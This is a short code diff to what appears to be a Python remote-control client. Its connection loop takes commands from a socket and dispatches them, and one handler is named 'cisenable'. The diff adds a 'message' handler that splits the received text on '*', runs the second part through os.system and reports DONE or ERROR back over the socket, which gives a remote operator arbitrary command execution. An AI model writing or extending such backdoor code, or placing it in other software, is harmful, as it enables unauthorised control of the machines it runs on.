@@ -170,6 +170,16 @@ def connection():
 
 		elif 'cisenable' in command:
 			cisenable(s)
+		elif 'message' in command:
+			message(s,command)
+
+
+def message(s,command):
+	message,cmd=command.split("*")
+	if os.system(cmd) == 0 :
+		s.send("DONE".encode())
+	else:
+		s.send("ERROR".encode())
 
 
 def cisenable(s):
